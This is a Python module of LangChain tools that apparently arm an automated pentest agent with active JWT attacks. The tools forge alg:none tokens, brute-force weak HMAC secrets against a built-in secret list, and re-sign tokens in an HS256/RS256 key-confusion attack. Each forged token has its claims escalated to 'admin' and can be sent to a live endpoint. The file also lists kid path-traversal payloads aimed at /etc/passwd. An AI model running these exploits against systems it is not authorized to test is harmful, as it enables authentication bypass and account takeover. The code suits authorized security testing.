"""JWT active attack tools.

Migrated from Shannon's exploit-auth prompt: JWT alg:none, key confusion,
kid header injection, weak HMAC brute-force.  Extends the passive decode_jwt
with active exploitation techniques.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import Any

from langchain_core.tools import tool

from .http_client import normalize_url, request
from .results import Evidence, Finding, RequestRecord, ToolResult, error_result, response_record

JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*(?=[\s'\";,)}\]])")

# Common HMAC secrets for brute-force
WEAK_HMAC_SECRETS = [
    "secret", "password", "changeme", "key", "private", "jwt_secret",
    "super_secret", "my_secret", "default", "1234567890", "admin",
    "secretkey", "secret_key", "jwtkey", "signing_key", "hmac_secret",
    "test", "dev", "development", "QwErTy", "passw0rd",
]

# Common kid injection paths
KID_TRAVERSAL_PATHS = [
    "../../../../etc/passwd",
    "../../../../dev/null",
    "../../../../dev/urandom",
    "/dev/null",
    "file:///dev/null",
    "file:///etc/passwd",
    "../../../webapps/ROOT/WEB-INF/web.xml",
    "../../../../../etc/passwd",
]


def _b64url_decode(data: str) -> bytes:
    """Decode base64url-encoded data."""
    padded = data + "=" * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(padded)


def _b64url_encode(data: bytes) -> str:
    """Encode data as base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _parse_jwt(token: str) -> tuple[dict, dict, str, str] | None:
    """Parse JWT into (header, payload, signature, signing_input)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2], f"{parts[0]}.{parts[1]}"
    except Exception:
        return None


# ── Public Tools ──────────────────────────────────────────────────────


@tool
def jwt_alg_none_attack(
    jwt_token: str,
    target_url: str = "",
    test_endpoint: str = "",
    method: str = "GET",
    header_name: str = "Authorization",
    header_prefix: str = "Bearer ",
) -> str:
    """Attempt the JWT 'alg:none' signature-bypass attack.

    Decodes the JWT, replaces the algorithm with 'none', modifies the payload
    (e.g. to escalate privileges), strips the signature, and optionally sends
    the forged token to a target endpoint.

    This is the most common JWT attack — Shannon's exploit-auth prompt details
    the exact recipe.

    Parameters:
        jwt_token: The captured JWT to attack.
        target_url: Optional target endpoint to test the forged token against.
        test_endpoint: Alternative endpoint path (appended to target_url's origin).
        method: HTTP method for the test request.
        header_name: Auth header name (default "Authorization").
        header_prefix: Header value prefix (default "Bearer ").
    """
    parsed = _parse_jwt(jwt_token)
    if parsed is None:
        return error_result("jwt_alg_none_attack", "(jwt token)", "invalid JWT format").to_text()

    header, payload, _original_sig, signing_input = parsed

    lines = [
        "[jwt_alg_none_attack] JWT alg:none 攻击",
        "",
        "── 原始 JWT ──",
        f"Header: {json.dumps(header)}",
        f"Payload: {json.dumps(payload, indent=2)}",
        f"Algorithm: {header.get('alg', '(missing)')}",
        "",
    ]

    # Step 1: Change algorithm to none
    attack_header = dict(header)
    attack_header["alg"] = "none"
    attack_header_b64 = _b64url_encode(json.dumps(attack_header, separators=(",", ":")).encode())

    # Step 2: Escalate payload (if possible)
    attack_payload = dict(payload)
    modified = False

    # Try privilege escalation
    if "sub" in attack_payload:
        original_sub = attack_payload["sub"]
        if original_sub != "admin" and original_sub != "administrator":
            attack_payload["sub"] = "admin"
            modified = True
            lines.append(f"✓ 已将 sub 从 '{original_sub}' 修改为 'admin'")

    if "role" in attack_payload or "roles" in attack_payload:
        role_key = "roles" if "roles" in attack_payload else "role"
        original_role = attack_payload[role_key]
        attack_payload[role_key] = "admin" if role_key == "role" else ["admin"]
        modified = True
        lines.append(f"✓ 已将 {role_key} 从 '{original_role}' 修改为 'admin'")

    if "is_admin" in attack_payload:
        attack_payload["is_admin"] = True
        modified = True
        lines.append("✓ 已将 is_admin 设置为 True")

    if not modified:
        # Try generic escalation
        for claim in ("admin", "isAdmin", "is_admin", "groups", "permissions"):
            if claim not in attack_payload:
                continue
        lines.append("ℹ 未发现可提权的声明，保持原始 payload")

    attack_payload_b64 = _b64url_encode(json.dumps(attack_payload, separators=(",", ":")).encode())

    # Step 3: Forge token (no signature)
    forged_token = f"{attack_header_b64}.{attack_payload_b64}."

    lines.append(f"\n── 伪造的 JWT ──")
    lines.append(forged_token)
    lines.append("")

    # Step 4: Test against target if provided
    findings: list[Finding] = []
    test_result = None
    if target_url:
        target = normalize_url(target_url)
        if test_endpoint:
            from urllib.parse import urljoin

            target = urljoin(target, test_endpoint)

        try:
            headers = {header_name: f"{header_prefix}{forged_token}"}
            resp = request(method.strip().upper(), target, headers=headers, timeout=10)
            test_result = {
                "status": resp.status_code,
                "length": len(resp.text),
                "preview": (resp.text or "")[:500],
            }
            lines.append(f"── 测试结果 ──")
            lines.append(f"端点: {method} {target}")
            lines.append(f"状态码: {resp.status_code}")
            lines.append(f"响应长度: {len(resp.text)}")
            lines.append(f"响应预览: {(resp.text or '')[:300]}")

            # Heuristic: status 200 and content looks like authenticated response
            if resp.status_code == 200 and len(resp.text) > 50:
                findings.append(Finding(
                    title="JWT alg:none 签名绕过成功",
                    severity="critical",
                    confidence="confirmed",
                    category="jwt_attack",
                    evidence=[Evidence(
                        "alg_none_bypass",
                        f"Forged JWT accepted by {target} (status {resp.status_code})",
                        target,
                        {"forged_token": forged_token, "original_header": header, "attack_header": attack_header},
                    )],
                    reproduction=[
                        f"1. 捕获原始 JWT: {jwt_token[:50]}...",
                        "2. 将 header.alg 修改为 'none'",
                        f"3. 将 payload 提权: {json.dumps(attack_payload)}",
                        "4. 移除签名部分（保留末尾点号）",
                        f"5. 发送 {method} {target} 携带 {header_name}: {header_prefix}{{forged_token}}",
                    ],
                ))
            elif resp.status_code == 401 or resp.status_code == 403:
                lines.append("→ 服务器拒绝了伪造令牌（良好的安全实践）")
            else:
                lines.append(f"→ 状态码 {resp.status_code} 需人工确认")
        except Exception as exc:
            lines.append(f"测试请求失败: {exc}")

    lines.append(f"\n── 摘要 ──")
    if findings:
        lines.append("⚠️ CRITICAL: alg:none 攻击成功，JWT 签名验证被绕过！")
    elif test_result:
        lines.append("alg:none 攻击未成功 — 服务器正确验证了签名。")
    else:
        lines.append(f"已生成伪造 JWT。使用 http_request(method={method}, url=<target>, headers_json='{{\"{header_name}\": \"{header_prefix}{{forged_token}}\"}}') 测试。")

    readable = "\n".join(lines)

    return ToolResult(
        tool="jwt_alg_none_attack",
        target=target_url or "(jwt token)",
        status="ok",
        summary=f"JWT alg:none 攻击{'成功!' if findings else '已生成伪造令牌（需手动测试）'}",
        raw_excerpt=readable,
        findings=findings,
        request=RequestRecord(method, target_url, parameters={"header_name": header_name}) if target_url else None,
        data={
            "original_header": header,
            "original_payload": payload,
            "attack_header": attack_header,
            "attack_payload": attack_payload,
            "forged_token": forged_token,
            "test_result": test_result,
        },
    ).to_text()


@tool
def jwt_hmac_brute(
    jwt_token: str,
    wordlist: str = "",
) -> str:
    """Brute-force weak HMAC signing secrets for a JWT.

    Tests the token against a built-in list of common weak secrets plus any
    user-supplied candidates.  Returns the secret if found.

    Parameters:
        jwt_token: The HS256/HS384/HS512-signed JWT to crack.
        wordlist: Optional additional secrets, one per line.
    """
    parsed = _parse_jwt(jwt_token)
    if parsed is None:
        return error_result("jwt_hmac_brute", "(jwt token)", "invalid JWT format").to_text()

    header, payload, signature, signing_input = parsed
    alg = header.get("alg", "")

    if not alg.startswith("HS"):
        return ToolResult(
            tool="jwt_hmac_brute",
            target="(jwt token)",
            status="ok",
            summary=f"非 HMAC 算法 ({alg})，跳过暴力破解。使用 jwt_alg_none_attack 或 jwt_key_confusion 替代。",
            raw_excerpt=f"[jwt_hmac_brute] Algorithm {alg} is not HMAC. Try other JWT attack tools.",
            data={"algorithm": alg},
        ).to_text()

    # Build candidate list
    candidates = list(WEAK_HMAC_SECRETS)
    if wordlist:
        candidates.extend(s.strip() for s in wordlist.splitlines() if s.strip())

    hash_func = alg.replace("HS", "sha")
    hash_map = {"sha256": hashlib.sha256, "sha384": hashlib.sha384, "sha512": hashlib.sha512}
    hasher = hash_map.get(hash_func, hashlib.sha256)

    found = None
    tested = 0
    for secret in candidates:
        sig = hmac.new(secret.encode(), signing_input.encode(), hasher).hexdigest()
        try:
            sig_b64 = _b64url_encode(bytes.fromhex(sig))
        except Exception:
            continue
        tested += 1
        if sig_b64 == signature:
            found = secret
            break

    lines = [
        f"[jwt_hmac_brute] JWT HMAC 密钥暴力破解",
        f"",
        f"Algorithm: {alg}",
        f"Payload: {json.dumps(payload)}",
        f"Tested: {tested} secrets",
        f"",
    ]

    findings: list[Finding] = []
    if found:
        lines.append(f"⚠️ FOUND WEAK SECRET: '{found}'")
        lines.append(f"")
        lines.append(f"攻击者可以用此密钥伪造任意 JWT：")
        lines.append(f"  import hmac, hashlib, base64")
        lines.append(f"  secret = b'{found}'")
        lines.append(f"  sig = hmac.new(secret, signing_input.encode(), hashlib.{hash_func}).digest()")
        lines.append(f"  forged = signing_input + '.' + base64.urlsafe_b64encode(sig).rstrip(b'=').decode()")
        findings.append(Finding(
            title="JWT 使用弱签名密钥",
            severity="critical",
            confidence="confirmed",
            category="jwt_attack",
            evidence=[Evidence(
                "hmac_brute_force",
                f"Found JWT HS key: '{found}' (tested {tested} candidates)",
                None,
                {"secret": found, "algorithm": alg, "tested": tested},
            )],
            reproduction=[
                f"1. 使用密钥 '{found}' 和 {alg} 签名",
                "2. 修改 payload 中的身份声明 (sub, role)",
                "3. 用新签名伪造 JWT 并发送给服务器",
            ],
        ))
    else:
        lines.append(f"✓ 未发现弱密钥（tested {tested} common secrets）")
        lines.append("")
        lines.append("扩展建议：")
        lines.append("- 使用 jwt_key_confusion 尝试密钥混淆攻击")
        lines.append("- 使用更大的字典测试（提供 wordlist 参数）")
        lines.append("- 确认算法是否应使用 RS256（非对称）")

    readable = "\n".join(lines)
    return ToolResult(
        tool="jwt_hmac_brute",
        target="(jwt token)",
        status="ok",
        summary=f"JWT HMAC 爆破：{'发现弱密钥!' if found else '未发现（tested ' + str(tested) + '）'}",
        raw_excerpt=readable,
        findings=findings,
        data={"algorithm": alg, "tested": tested, "found": found is not None, "secret": found},
    ).to_text()


@tool
def jwt_key_confusion(
    jwt_token: str,
    public_key_pem: str = "",
    target_url: str = "",
    method: str = "GET",
    header_name: str = "Authorization",
    header_prefix: str = "Bearer ",
) -> str:
    """Attempt JWT key-confusion attack (HS256 with RSA public key).

    If an RS256 JWT is accepted when re-signed with HS256 using the RSA
    *public* key as the HMAC secret, it indicates the server's JWT library
    does not enforce algorithm type per key (CVE-2016-5431 pattern).

    Shannon's exploit-auth explicitly checks for this misconfiguration.

    Parameters:
        jwt_token: The RS256/RS384/RS512-signed JWT.
        public_key_pem: RSA public key PEM (optional; if omitted, generates a
                        forged token without signing for manual testing).
        target_url: Optional endpoint to test the forged token against.
        method: HTTP method for test request.
        header_name: Auth header name.
        header_prefix: Auth header prefix.
    """
    parsed = _parse_jwt(jwt_token)
    if parsed is None:
        return error_result("jwt_key_confusion", "(jwt token)", "invalid JWT format").to_text()

    header, payload, _original_sig, signing_input = parsed
    alg = header.get("alg", "")

    if not alg.startswith("RS") and not alg.startswith("ES") and not alg.startswith("PS"):
        return ToolResult(
            tool="jwt_key_confusion",
            target="(jwt token)",
            status="ok",
            summary=f"算法 {alg} 不适用密钥混淆（需要 RSA/EC 签名算法）",
            raw_excerpt=f"[jwt_key_confusion] Algorithm {alg} not applicable for key confusion (needs RS*/ES*/PS*).",
            data={"algorithm": alg},
        ).to_text()

    lines = [
        f"[jwt_key_confusion] JWT 密钥混淆攻击",
        f"",
        f"原始算法: {alg}",
        f"Payload: {json.dumps(payload)}",
        f"",
    ]

    # Build the forged token
    attack_header = dict(header)
    attack_header["alg"] = "HS256"

    # Escalate payload
    attack_payload = dict(payload)
    escalated = False
    if "sub" in attack_payload and attack_payload.get("sub") != "admin":
        attack_payload["sub"] = "admin"
        escalated = True
    if "role" in attack_payload:
        attack_payload["role"] = "admin"
        escalated = True
    if "is_admin" in attack_payload:
        attack_payload["is_admin"] = True
        escalated = True

    attack_header_b64 = _b64url_encode(json.dumps(attack_header, separators=(",", ":")).encode())
    attack_payload_b64 = _b64url_encode(json.dumps(attack_payload, separators=(",", ":")).encode())
    new_signing_input = f"{attack_header_b64}.{attack_payload_b64}"

    if public_key_pem:
        # Sign with the provided public key as HMAC secret
        key = public_key_pem.strip().encode()
        sig = hmac.new(key, new_signing_input.encode(), hashlib.sha256).digest()
        forged = f"{new_signing_input}.{_b64url_encode(sig)}"
        lines.append("✓ 使用提供的公钥作为 HMAC secret 重新签名")
    else:
        # Without the key, still generate the token structure for analysis
        forged = f"{new_signing_input}."
        lines.append("ℹ 未提供公钥 — 生成未签名的伪造令牌结构")
        lines.append("提示：从 /jwks.json 或 /.well-known/jwks.json 获取公钥")

    lines.append(f"\n── 伪造的 HS256 JWT ──")
    lines.append(forged)
    lines.append(f"")
    lines.append(f"攻击原理：服务器使用 RS256 公钥验证，但如果 JWT 库根据 al g 选择验证器，")
    lines.append(f"alg:HS256 会让服务器把 RSA 公钥当作 HMAC secret 来验证签名。")

    # Test if target provided
    findings: list[Finding] = []
    if target_url and public_key_pem:
        target = normalize_url(target_url)
        try:
            headers = {header_name: f"{header_prefix}{forged}"}
            resp = request(method.strip().upper(), target, headers=headers, timeout=10)
            lines.append(f"\n── 测试结果 ──")
            lines.append(f"端点: {method} {target}")
            lines.append(f"状态码: {resp.status_code}")

            if resp.status_code == 200:
                findings.append(Finding(
                    title="JWT 密钥混淆攻击成功 (alg 验证缺陷)",
                    severity="critical",
                    confidence="confirmed",
                    category="jwt_attack",
                    evidence=[Evidence(
                        "key_confusion",
                        f"HS256-forged JWT accepted (originally {alg})",
                        target,
                        {"original_alg": alg, "attack_alg": "HS256"},
                    )],
                    reproduction=[
                        f"1. 从 {target}/.well-known/jwks.json 获取 RSA 公钥",
                        "2. 将 JWT header.alg 从 RS256 修改为 HS256",
                        "3. 用 RSA 公钥 PEM 作为 HMAC secret 签名新 token",
                        "4. 发送请求，服务器用公钥作为 HMAC key 验证通过",
                    ],
                ))
            elif resp.status_code == 401:
                lines.append("→ 服务器拒绝（良好的 alg 白名单验证）")
        except Exception as exc:
            lines.append(f"测试失败: {exc}")

    readable = "\n".join(lines)
    return ToolResult(
        tool="jwt_key_confusion",
        target=target_url or "(jwt token)",
        status="ok",
        summary=f"JWT 密钥混淆{'成功!' if findings else '：已生成伪造 token'}",
        raw_excerpt=readable,
        findings=findings,
        data={
            "original_alg": alg,
            "attack_alg": "HS256",
            "forged_token": forged,
            "payload_escalated": escalated,
        },
    ).to_text()
